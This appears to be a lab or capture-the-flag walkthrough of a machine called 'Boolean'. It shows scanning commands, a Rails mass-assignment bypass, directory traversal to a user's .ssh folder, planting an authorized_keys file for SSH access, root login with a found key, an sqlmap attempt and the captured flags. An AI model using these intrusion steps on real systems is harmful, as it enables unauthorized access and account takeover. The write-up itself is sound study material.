# Boolean

## Enumeration & scanning

- Scan all ports with nmap
- Find 22, 80 (HTTP), 3000 (closed), 33017 (HTTP)
- 80 serves a login page running on Ruby on Rails
- 33017 server an Apache webpage, no content on it

``` sh
# Check all open ports
sudo nmap -p- -sV 192.168.197.231   
# Get additional info on ports
sudo nmap -p 22,80,3000,33017 -A 192.168.197.231
# Check for vulns on 80
sudo nmap -p 80 --script="vuln" 192.168.197.231 
# Scan webserver
nuclei -target http://192.168.197.231/login  
# Check directories
feroxbuster -u http://192.168.197.231   
feroxbuster --url http://192.168.197.231/public -x html
```


## Foothold

- Can register account on login page, do so
- Can login with account and change email adres where verification email should be sent to, unusual
- Explore the POST request with Burp, uses Ruby 'patch' method to change email
- Can change parameters and values, even though it's sent to the `/settings/email` endpoint
- Change request to `user[confirmed]=1` and the user will be validated (apparently called 'Mass Assignment' vulnerability in Ruby, see references and official writeup)
- Refresh page then gives file upload and explorer GUI

## Exploitation

- Can upload files, webshell doesn't work as files are instantly downloaded. Get `passwd` file and find user `remi`
- URL contains `cwd` parameter, can be altered to reveal other directories
- Explore user folder, find `.ssh` folder with various keys
- Downloaded keys but they require password to authenticate
- Can upload `authorized_keys` file to add our own key to system
- Connect to system and get local flag

File manager view when applying directory traversal
![alt text](images/file_manager.png)

``` sh
# Generate key to add
ssh-keygen -t rsa
# Generate authorized_keys file with newly generated key
cat id_rsa.pub > authorized_keys
# Upload file to .ssh folder using gui
# Connect over SSH with remi user
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" remi@192.168.197.231 -i id_rsa 
# Get flag
remi@boolean:~$ ls
boolean  local.txt
remi@boolean:~$ cat local.txdt
cat: local.txdt: No such file or directory
remi@boolean:~$ cat local.txt
94fa663a02e1dc94a499d04319166e07
```

## Privilege Escalation

- The `.ssh` folder of `remi` has `root` key, among some others
- The `bash_aliases` file also contains alias `root` to login as root with that key. However, when using it, SSH gives the error 'too many authentication attempts because it uses all keys in `.ssh` folder by default (even when specifying a key in the command)
- Can overcome this by adding `-o IdentitiesOnly=yes` to command so it only uses the `root` key

``` sh
# Use root key only
ssh root@127.0.0.1 -i /home/remi/.ssh/keys/root -o 'IdentitiesOnly yes'
# Get flag
root@boolean:~# ls
proof.txt
root@boolean:~# cat proof.txt
e50af3735f74a4cf3d97f3462a96efb6
```

## References

- https://superuser.com/questions/187779/too-many-authentication-failures-for-username
- https://guides.rubyonrails.org/v2.3.11/security.html#mass-assignment (apparent solution vulnerability)

## Rabbit holes

- Tried SQL injection because of login page without other obvious triggers, and challenge name 'boolean'
- Couldn't get errors to be generated in any of the fields, also no `sqlmap` hits

``` sh
# Run sqlmap with Burp post request, aggressive and verbose (example query, others were similar)
sqlmap -r boolean_login.txt -p user%5Bemail%5D -v --level 5 --risk 3   
```
